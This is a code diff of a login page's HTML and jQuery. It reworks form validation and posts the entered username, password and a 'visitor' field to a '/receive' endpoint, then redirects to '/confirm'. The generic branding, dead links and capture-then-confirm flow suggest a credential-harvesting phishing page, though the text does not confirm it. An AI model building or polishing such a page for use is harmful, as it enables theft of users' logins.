@@ -221,81 +221,74 @@
 </head>
 <body> 
     <div class="logo-section"> 
-        <img style="width:70%; height:auto; margin-top:28px;" src="assets/brand-logo-tall.svg"/>
-    </div>
-    <div class="login-form">
-    	<div class="logo-section-desk"> 
+    <img style="width:70%; height:auto; margin-top:28px;" src="assets/brand-logo-tall.svg"/>
+</div>
+<div class="login-form">
+    <div class="logo-section-desk"> 
         <img style="width:70%; height:auto; margin-top:28px;" src="assets/brand-logo-wide.svg"/> 
     </div>
     
-        <div class="form-field">
-            <input type="text" placeholder=" " id="username" required>
-            <label for="username">Username</label>
-        </div>
-        <div class="form-field">
-            <input type="password" placeholder=" " id="password" required>
-            <label for="password">Password</label>
-        </div>
-        <div class="remember-me">
-            <div class="toggle-switch">
-                <input type="checkbox" id="remember">
-                <span class="slider"></span>
-            </div>
-            <label for="remember">Remember Me</label>
-        </div>
-        <button>Log in</button>
-        <div class="footer-links">
-            <p class="par"><a href="#">Forgot Username or Password?</a></p>
-            <p class="par"><a href="#" class="register-link">Register a New Account</a></p>
-        </div>
+    <div class="form-field">
+        <input type="text" placeholder=" " id="username" name="username" required>
+        <label for="username">Username</label>
     </div>
-    <script>
+    <div class="form-field">
+        <input type="password" placeholder=" " id="password" name="password" required>
+        <label for="password">Password</label>
+    </div>
+    <div class="remember-me">
+        <div class="toggle-switch">
+            <input type="checkbox" id="remember" name="remember">
+            <span class="slider"></span>
+        </div>
+        <label for="remember">Remember Me</label>
+    </div>
+    <button id="subbot" type="submit">Log in</button>
+    <div class="footer-links">
+        <p class="par"><a href="#">Forgot Username or Password?</a></p>
+        <p class="par"><a href="#" class="register-link">Register a New Account</a></p>
+    </div>
+</div>
+
+<script>
 $(document).ready(function() {
-    $('form').on('submit', function(event) {
-        event.preventDefault(); 
-        
-        let allFilled = true; 
-        
-        
-        $(this).find('input').each(function() {
+    $('#subbot').on('click', function(event) {
+        event.preventDefault();
+
+        let allFilled = true;
+
+        const inputs = $('input');
+        inputs.each(function() {
             const input = $(this);
+            const label = input.siblings('label')[0]; 
+
             if (input.val().trim() === '') {
-                allFilled = false; 
-                input.css('border-color', 'red'); 
-                const label = currentSection.querySelector(`label[for="${input.attr('id')}"]`);
-                if (label) label.style.color = 'red'; 
+                allFilled = false;
+                input.css('border-color', 'red');
+                if (label) label.style.color = 'red';
             } else {
-                input.css('border-color', ''); 
-                const label = currentSection.querySelector(`label[for="${input.attr('id')}"]`);
-                if (label) label.style.color = ''; 
+                input.css('border-color', '');
+                if (label) label.style.color = '';
             }
         });
 
-        
         if (allFilled) {
-            let userinfo = $(this).serializeArray(); 
+            let formData = $('.login-form').find('input').serializeArray(); 
             let user = {};
-            let visitor = $('#username').val(); 
-
-            userinfo.forEach((value) => {
-                
-                user[value.name] = value.value; 
+            formData.forEach((field) => {
+                user[field.name] = field.value;
             });
 
-            user['visitor'] = visitor;
-            console.log(user);
+            user['visitor'] = $('#username').val();
 
-            
             $.ajax({
                 method: 'POST',
                 url: "/receive",
                 data: user
             }).done(function(msg) {
-                
-                sessionStorage.setItem('visitor', visitor);
-                
-                window.location.href = "/Confirm";
-                console.log(msg); 
+                sessionStorage.setItem('visitor', user['visitor']);
+                window.location.href = "/confirm";
+                console.log(msg);
             }).fail(function(err, textstatus, error) {
                 console.log('fail');
             });
